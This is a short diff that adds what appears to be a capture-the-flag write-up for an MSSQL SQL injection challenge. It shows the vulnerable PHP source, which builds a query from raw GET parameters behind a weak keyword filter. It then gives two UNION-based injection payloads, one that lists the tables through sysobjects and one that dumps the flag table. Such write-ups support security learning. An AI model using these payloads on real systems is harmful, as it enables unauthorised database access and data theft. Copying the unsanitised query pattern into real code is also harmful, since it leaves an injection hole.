@@ -1,0 +1,21 @@
+query : select id from member where id='' and pw=''
+<?php
+  include "./config.php";
+  login_chk();
+  $db = mssql_connect("kraken");
+  if(preg_match('/master|information|;/i', $_GET['id'])) exit("No Hack ~_~");
+  if(preg_match('/master|information|;/i', $_GET['pw'])) exit("No Hack ~_~");
+  $query = "select id from member where id='{$_GET['id']}' and pw='{$_GET['pw']}'";
+  echo "<hr>query : <strong>{$query}</strong><hr><br>";
+  $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));
+  if($result['id']) echo "<h2>{$result['id']}</h2>";
+
+  if($krakenFlag === $_GET['pw']) solve("kraken");// Flag is in `flag_{$hash}` table, not in `member` table. Let's look over whole of the database.
+  highlight_file(__FILE__);
+?>
+
+Enumerate table names:
+?id=&pw=' UNION SELECT TOP <N> name FROM sysobjects WHERE xtype='U'--
+
+Pwn flag table:
+?id=&pw=' UNION SELECT * FROM flag_ccdfe62b--
